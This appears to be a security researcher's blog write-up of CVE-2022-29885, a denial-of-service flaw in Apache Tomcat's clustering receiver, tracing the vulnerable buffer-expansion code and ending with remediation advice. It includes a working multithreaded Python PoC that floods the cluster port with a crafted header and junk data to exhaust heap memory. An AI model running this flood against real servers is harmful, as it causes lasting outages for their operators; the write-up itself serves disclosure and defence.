---
title: "CVE-2022-29885 Apache Tomcat Cluster Service DoS"
date: 2022-07-13
---

## Warning
While performing the analysis I discovered that this was a part of a research made by 4ra1n, who reported the issue to the Apache Tomcat Security Team on 17 April 2022 and marked as CVE-2022-29885. Nonetheless, I had no luck finding a suitable PoC of the vulnerability.

**Update #2**: Finally found the website of the [author](https://4ra1n.love/post/5zNrXSlvJ/?ref=voidzone.me). Credits to him for the CVE.

**Update #3**: An old Unsafe Deserialization was found. [blogpost](https://blog.csdn.net/u011721501/article/details/88637270?ref=voidzone.me) (unknown author or I'm unable to translate chinese.).

## Introduction
As part of my latest research I was analyzing the Apache Tomcat source code and I occasionally stumbled upon the clustering functionality.

## Apache Tomcat
For those who lived under a rock for the last 10 years, Apache Tomcat is (maybe) the most known free and open-source implementation of the Jakarta Servlet, Jakarta EL and Websocket technologies and it is mainly used to host Java-written web applications.

One part that we will focus on and that caught my attention during the research, was the Clustering functionality.

## Clustering
Clustering is the task of grouping multiple objects in a way that they could work together in order to distribute the load over the instances of the group.

The concept of clustering is not limited to applications or networks only, in fact the concept of clustering can be applied to the storage world like, for example, a RAID disk joins a specific cluster of disks in order to provide redundant and fail-safe architecture.

A simple and most common use of the clustering concepts could be summarized by the following schema, where a Load Balancer forward the incoming request through a cluster of web servers:
![cluster example](/tomcatcluster/image-56.png)

Web Server Clustering example
Analysis of the Apache Tomcat Clustering functionality
How to configure clustering on Apache Tomcat? Nothing easier (they say):

```xml
<Cluster className="org.apache.catalina.ha.tcp.SimpleTcpCluster"
                 channelSendOptions="8">

          <Manager className="org.apache.catalina.ha.session.DeltaManager"
                   expireSessionsOnShutdown="false"
                   notifyListenersOnReplication="true"/>

          <Channel className="org.apache.catalina.tribes.group.GroupChannel">
            <Membership className="org.apache.catalina.tribes.membership.McastService"
                        address="228.0.0.4"
                        port="45564"
                        frequency="500"
                        dropTime="3000"/>
            <Receiver className="org.apache.catalina.tribes.transport.nio.NioReceiver"
                      address="auto"
                      port="4000"
                      autoBind="100"
                      selectorTimeout="5000"
                      maxThreads="6"/>

            <Sender className="org.apache.catalina.tribes.transport.ReplicationTransmitter">
              <Transport className="org.apache.catalina.tribes.transport.nio.PooledParallelSender"/>
            </Sender>
            <Interceptor className="org.apache.catalina.tribes.group.interceptors.TcpFailureDetector"/>
            <Interceptor className="org.apache.catalina.tribes.group.interceptors.MessageDispatchInterceptor"/>
          </Channel>

          <Valve className="org.apache.catalina.ha.tcp.ReplicationValve"
                 filter=""/>
          <Valve className="org.apache.catalina.ha.session.JvmRouteBinderValve"/>

          <Deployer className="org.apache.catalina.ha.deploy.FarmWarDeployer"
                    tempDir="/tmp/war-temp/"
                    deployDir="/tmp/war-deploy/"
                    watchDir="/tmp/war-listen/"
                    watchEnabled="false"/>

          <ClusterListener className="org.apache.catalina.ha.session.ClusterSessionListener"/>
        </Cluster>
```

Let's break down the above config file:

- The `<Cluster>` element defines a cluster listener class that will be instantiated. org.apache.catalina.ha.tcp.SimpleTcpCluster in this case.
- The `<Manager>` is responsible for incoming messages handling and it's handled by the org.apache.catalina.ha.session.DeltaManager class.
- The `<Receiver>` represents the front-man when dealing with incoming objects. It is currently handled by the org.apache.catalina.tribes.transport.nio.NioReceiver class. For the impatient: this class will be our target.
Other elements are just settings for replication, deployers and message dispatchers.

## A tour on the source code
By now we know that there's a service running on port 4000 (as stated in the `<Receiver>` definition above, and that it is accepting incoming messages.

The following code will be executed when the org.apache.catalina.tribes.transport.nio.NioReceiver class is started:

```java
// [...]

/**
* Start thread and listen
*/
@Override
public void run() {
	running = true;
	try {
	 	listen();
	} catch (Exception x) {
	  	log.error(sm.getString("nioReceiver.run.fail"), x);
	} finally {
	  	running = false;
	}
}
// NioReceiver.java#446
```

The listen method will be the main loop that listens for incoming data:

```java
while (doListen() && selector != null) {
	//..the rest of the function..
	readDataFromSocket(key);        
}
// NioReceiver.java#280
```
While the readDataFromSocket runs a NioReplicationTask object:

```java
protected void readDataFromSocket(SelectionKey key) throws Exception {
        NioReplicationTask task = (NioReplicationTask) getTaskPool().getRxTask();
        if (task == null) {
            // No threads/tasks available, do nothing, the selection
            // loop will keep calling this method until a
            // thread becomes available, the thread pool itself has a waiting mechanism
            // so we will not wait here.
            if (log.isDebugEnabled()) {
                log.debug("No TcpReplicationThread available");
            }
        } else {
            // invoking this wakes up the worker thread then returns
            //add task to thread pool
            task.serviceChannel(key);
            getExecutor().execute(task);
        }
    }
    // NioReceiver.java#468
```
Fast-forward to the actual vulnerable code brings to:

```java
protected void drainChannel (final SelectionKey key, ObjectReader reader) throws Exception {
        reader.access();
        ReadableByteChannel channel = (ReadableByteChannel) key.channel();
        int count=-1;
        SocketAddress saddr = null;

        if (channel instanceof SocketChannel) {
            // loop while data available, channel is non-blocking
            while ((count = channel.read (buffer)) > 0) {
                buffer.flip();      // make buffer readable
                if ( buffer.hasArray() ) {
                    reader.append(buffer.array(),0,count,false);
                } else {
                    reader.append(buffer,count,false);
                }
                buffer.clear();     // make buffer empty
                //do we have at least one package?
                if ( reader.hasPackage() ) {
                    break;
                }
            }
        } else if (channel instanceof DatagramChannel) {
            DatagramChannel dchannel = (DatagramChannel)channel;
            saddr = dchannel.receive(buffer);
            buffer.flip();      // make buffer readable
            if ( buffer.hasArray() ) {
                reader.append(buffer.array(),0,buffer.limit()-buffer.position(),false);
            } else {
                reader.append(buffer,buffer.limit()-buffer.position(),false);
            }
            buffer.clear();     // make buffer empty
            //did we get a package
            count = reader.hasPackage()?1:-1;
        }
// NioTaskReceiver.java#164
```

The code flows to a location when the data from the socket is appended via the `append()` method of an `ObjectReader` object, the reader variable.

The `append()` method simply add the sent data to a buffer and continues.
![what's the point](/tomcatcluster/image-59.png)


While analyzing the `XByteBuffer` class, which is nothing more than a serializable `POJO`, it shows what the application is expecting from the input socket:

```java
public class XByteBuffer implements Serializable {

    //...

    private static final byte[] START_DATA = {70,76,84,50,48,48,50};
    private static final byte[] END_DATA = {84,76,70,50,48,48,51};
```
The receiver expects a header to be sent in order to recognize that this is an XByteBuffer object. The above byte sequences are just the decimal representation of the ASCII sequences: `FLT2002` for `START_DATA` and `TLF2003` for `END_DATA`.

So, assuming an attacker never sends an END_DATA char sequence, what could go wrong?


## PoC || GTFO

```python
#!/usr/bin/env python3
# coding: utf-8
from pwn import *
import time
import threading
import subprocess
threads = []


def send_payload():
    r = remote("localhost", 4000)
    while True:
        r.send(b"FLT2002" + b"A" * 10000)

for _ in range(5):
    new_thread = threading.Thread(target=send_payload)
    threads.append(new_thread)
    new_thread.start()
for old_thread in threads:
    old_thread.join()
```

The above code is pretty straight forward: we force the application to recognize this object as an XByteBuffer by specifying a START_DATA header and we append junk data after.

By executing the above script, the following stack trace shows up on the Tomcat logs:

![stack trace](/tomcatcluster/image-60.png)
![memory analysis - top command](/tomcatcluster/image-61.png)
![memory analysis - free command](/tomcatcluster/image-62.png)


**Note**: I allocated 2G only to the Java Heap Space in order to avoid locks on my machine. This attack heavily depends on the allocated Heap space for that particular VM.

**Note 2**: Once the attacks is made, the heap space isn't cleaned up, even after the attack is stopped. This will cause a permanent Denial Of Service condition until the next service restart.

## Why this happens?
By following the stack trace, the vulnerable method is the append() of the XByteBuffer class, which, when a new buffer is bigger than the previous, it tries to allocate a new one by calling the expand method and passing the size of the newly created buffer.

```java
public boolean append(ByteBuffer b, int len) {
        int newcount = bufSize + len;
        if (newcount > buf.length) {
            expand(newcount); // <--- vulnerable code
        }
        b.get(buf,bufSize,len);

        bufSize = newcount;

        if ( discard ) {
            if (bufSize > START_DATA.length && (firstIndexOf(buf, 0, START_DATA) == -1)) {
                bufSize = 0;
                log.error(sm.getString("xByteBuffer.discarded.invalidHeader"));
                return false;
            }
        }
        return true;

    }
    // XByteBuffer#158
```

```java
public void expand(int newcount) {
        //don't change the allocation strategy
        byte newbuf[] = new byte[Math.max(buf.length << 1, newcount)];
        System.arraycopy(buf, 0, newbuf, 0, bufSize); // <-- vulnerable code
        buf = newbuf;
    }
```
With the result of allocating too much space for a single object.

## What happens if I send fewer junk data?
It simply takes more time to fill the heap until it is full. In my tests, I tried with 1000 A, 5 threads and 2g of memory for JVM. It took ~15secs to fill up the heap space with the same results: heap full, cluster functionality unstable, high memory usage.

## Further info & Remediation
While the Apache Tomcat Security team is aware of this issue, their "FIX" is just an update on the documentation that advise to not open the cluster port on untrusted networks.

![official fix](https://github.com/apache/tomcat/commit/0fa7721f11d565a2cd2e44366c388ad6a3e6357d?ref=voidzone.me)

Moral of the story: don't open that door port on untrusted networks.
![don't open that port](/tomcatcluster/image-63.png)



